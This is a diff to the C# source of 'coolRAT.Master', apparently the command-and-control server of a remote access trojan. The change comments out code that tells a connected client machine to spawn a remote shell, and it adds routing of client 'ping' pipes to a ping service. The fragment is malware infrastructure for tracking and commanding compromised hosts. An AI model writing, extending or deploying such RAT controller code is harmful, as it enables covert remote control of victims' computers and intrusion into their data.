@@ -31,19 +31,39 @@ namespace coolRAT.Master
                 /////////////////////////////////////////////////////////////////////
                Task.Run(() =>
                 {
-                    ConnectShellPacket shell_packet = new ConnectShellPacket(client.UniqueId);
-                    client.Pipes.MainPipe.SendPacket(shell_packet);
-                    Console.WriteLine($"Told client {client.UniqueId} to spawn a new shell.");
+                    //Thread.Sleep(1000);
+                    //ConnectShellPacket shell_packet = new ConnectShellPacket(client.UniqueId);
+                    //client.Pipes.MainPipe.SendPacket(shell_packet);
+                    //Console.WriteLine($"Told client {client.UniqueId} to spawn a new shell.");
                 });
                 /////////////////////////////////////////////////////////////////////
                 return;
             }
             if (packet.Type == "ConnectPipePacket")
             {
+                ConnectPipePacket connectPipePacket = ConnectPipePacket.Deserialize(packet_raw);
                 ConnectPipePacket_PacketProcessor connectPipePacket_PacketProcessor
-                    = new ConnectPipePacket_PacketProcessor(Connection, ConnectPipePacket.Deserialize(packet_raw), MasterListener.ConnectedClients);
+                    = new ConnectPipePacket_PacketProcessor(Connection, connectPipePacket, MasterListener.ConnectedClients);
 
                 connectPipePacket_PacketProcessor.Process();
+
+                if(connectPipePacket.PipeType == PipeType.Ping)
+                {
+                    // Exception in packet handling (dosłownie wyjątek, nie błąd)
+                    if (!MasterListener.ConnectedClients.ContainsKey(connectPipePacket.ClientId))
+                        return;
+                    PacketListenerLoop parent_loop = sender as PacketListenerLoop;
+                    TcpConnection connection = parent_loop.Connection;
+                    parent_loop.AbortLoop = true;
+                    Task.Run(() =>
+                    {
+                        // Redirect connection to the ping service
+                        MasterListener.PingService.AddClient(MasterListener.ConnectedClients[connectPipePacket.ClientId], false);
+                        MasterListener.PingService.ConnectedClients[connectPipePacket.ClientId].WaitForTimeout();
+                        Console.WriteLine("Stop redirecting ping pipe");
+                        Task.Run(() => parent_loop.Run());
+                    });
+                }
                 return;
             }
             if (packet.Type == "DisconnectPipePacket")
